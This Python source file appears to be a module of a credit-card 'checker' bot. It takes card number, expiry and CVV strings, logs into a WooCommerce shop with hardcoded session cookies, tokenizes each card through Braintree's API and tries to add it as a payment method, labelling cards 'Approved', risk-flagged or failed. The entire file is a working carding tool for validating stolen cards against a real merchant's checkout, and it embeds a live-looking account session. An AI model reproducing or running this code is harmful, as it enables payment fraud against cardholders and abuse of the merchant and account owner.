import asyncio
import base64
import re
import time
import user_agent
from FUNC.usersdb_func import *
from FUNC.defs import *


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


user = user_agent.generate_user_agent()


async def create_braintree_auth(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")

        cookies = {
            '_gcl_au': '1.1.1781813590.1744290394',
            '_ga': 'GA1.1.1103121085.1744290394',
            'formillaVisitorGuidcs5164ad-59eb-4002-994c-535607ab442f': '9b4e3772-3a04-475b-be5d-93adaa433cf0',
            '__stripe_mid': 'a5654157-fd7b-4744-b9c1-259e2cb7367e70ee00',
            '__stripe_sid': 'ebbd8c42-1a2f-418c-adc0-51662352e26b9cf996',
            'wordpress_logged_in_b88b6c7d48658c9d134b50f9d05d7389': 'mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7Ca64dcb0b28fde9a4b28e940b5fb6b4d4b9fc77c9ce55a6fdb0ab10a42b5912ff',
            'wp_woocommerce_session_b88b6c7d48658c9d134b50f9d05d7389': '15006%7C%7C1744463185%7C%7C1744459585%7C%7C4b18f05cea7e7edee6c7415a2b0de4e7',
            'wp_automatewoo_visitor_b88b6c7d48658c9d134b50f9d05d7389': 're31dfv47tudtuklwa3j',
            'wp_automatewoo_session_started': '1',
            'wpx_logged': '1',
            '_ga_XJVPQDP3N7': 'GS1.1.1744290394.1.1.1744290586.0.0.0',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'dnt': '1',
            'priority': 'u=0, i',
            'referer': 'https://shimmeringceremony.com/my-account/payment-methods/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = await session.get(
            'https://shimmeringceremony.com/my-account/additional-payment-method/',
            cookies=cookies,
            headers=headers,
        )

        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)[0]
        client_token = gets(response.text, '"client_token_nonce":"', '"')

        cookies2 = {
            'wordpress_sec_b88b6c7d48658c9d134b50f9d05d7389': 'mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7C1bff37464dc5ee7b4817726eeb11640e8978e9c6cc5c4e8b793140cfd9475e98',
            '_gcl_au': '1.1.1781813590.1744290394',
            '_ga': 'GA1.1.1103121085.1744290394',
            'formillaVisitorGuidcs5164ad-59eb-4002-994c-535607ab442f': '9b4e3772-3a04-475b-be5d-93adaa433cf0',
            '__stripe_mid': 'a5654157-fd7b-4744-b9c1-259e2cb7367e70ee00',
            '__stripe_sid': 'ebbd8c42-1a2f-418c-adc0-51662352e26b9cf996',
            'wordpress_logged_in_b88b6c7d48658c9d134b50f9d05d7389': 'mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7Ca64dcb0b28fde9a4b28e940b5fb6b4d4b9fc77c9ce55a6fdb0ab10a42b5912ff',
            'wp_woocommerce_session_b88b6c7d48658c9d134b50f9d05d7389': '15006%7C%7C1744463185%7C%7C1744459585%7C%7C4b18f05cea7e7edee6c7415a2b0de4e7',
            'wp_automatewoo_visitor_b88b6c7d48658c9d134b50f9d05d7389': 're31dfv47tudtuklwa3j',
            'wp_automatewoo_session_started': '1',
            'wpx_logged': '1',
            'formillaAutoMessageListcs5164ad-59eb-4002-994c-535607ab442f': '28774',
            'formillaLastAutoMessageIdDisplayedcs5164ad-59eb-4002-994c-535607ab442f': '28774',
            '_ga_XJVPQDP3N7': 'GS1.1.1744290394.1.1.1744291540.0.0.0',
        }

        headers2 = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://shimmeringceremony.com',
            'priority': 'u=1, i',
            'referer': 'https://shimmeringceremony.com/my-account/additional-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token,
        }

        response2 = await session.post(
            'https://shimmeringceremony.com/wp-admin/admin-ajax.php',
            cookies=cookies2,
            headers=headers2,
            data=data,
        )

        client_data = response2.json()['data']
        decoded_token = base64.b64decode(client_data).decode('utf-8')
        authorization_fingerprint = gets(decoded_token, 'authorizationFingerprint":"', '"')

        headers3 = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {authorization_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': user,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'a039a877-4ff2-4e4c-911a-02407e425658',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response3 = await session.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers3,
            json=json_data,
        )

        token = gets(response3.text, '{"token":"', '","')

        cookies3 = {
            '_gcl_au': '1.1.1781813590.1744290394',
            '_ga': 'GA1.1.1103121085.1744290394',
            'formillaVisitorGuidcs5164ad-59eb-4002-994c-535607ab442f': '9b4e3772-3a04-475b-be5d-93adaa433cf0',
            '__stripe_mid': 'a5654157-fd7b-4744-b9c1-259e2cb7367e70ee00',
            '__stripe_sid': 'ebbd8c42-1a2f-418c-adc0-51662352e26b9cf996',
            'wordpress_logged_in_b88b6c7d48658c9d134b50f9d05d7389': 'mikexedwin%7C1745500080%7CgDCNfXJtxV2yH4ymzwJosbFuAu0ElZUYDP2oJSQeEny%7Ca64dcb0b28fde9a4b28e940b5fb6b4d4b9fc77c9ce55a6fdb0ab10a42b5912ff',
            'wp_woocommerce_session_b88b6c7d48658c9d134b50f9d05d7389': '15006%7C%7C1744463185%7C%7C1744459585%7C%7C4b18f05cea7e7edee6c7415a2b0de4e7',
            'wp_automatewoo_visitor_b88b6c7d48658c9d134b50f9d05d7389': 're31dfv47tudtuklwa3j',
            'wp_automatewoo_session_started': '1',
            'wpx_logged': '1',
            'formillaAutoMessageListcs5164ad-59eb-4002-994c-535607ab442f': '28774',
            'formillaLastAutoMessageIdDisplayedcs5164ad-59eb-4002-994c-535607ab442f': '28774',
            '_ga_XJVPQDP3N7': 'GS1.1.1744290394.1.1.1744291531.0.0.0',
        }

        headers4 = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://shimmeringceremony.com',
            'priority': 'u=0, i',
            'referer': 'https://shimmeringceremony.com/my-account/additional-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        data2 = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'wc_braintree_paypal_device_data': '{"correlation_id":"c1539849f49dea3d4a7d2042ece06915"}',
            'wc_braintree_paypal_payment_nonce': '',
            'wc_braintree_paypal_amount': '0.00',
            'wc_braintree_paypal_currency': 'USD',
            'wc_braintree_paypal_locale': 'en_us',
            'wc-braintree-paypal-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/additional-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response4 = await session.post(
            'https://shimmeringceremony.com/my-account/additional-payment-method/',
            cookies=cookies3,
            headers=headers4,
            data=data2,
        )

        text = response4.text
        pattern = r'Status code (.*?)\s*</li>'
        match = re.search(pattern, text)
        if match:
            result = match.group(1)
            if 'risk_threshold' in text:
                result = "RISK: Retry this BIN later."
        else:
            if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
                result = "1000: Approved"
            else:
                result = "Error"

        await asyncio.sleep(14)

        return response4.text

    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())
        return str(e)
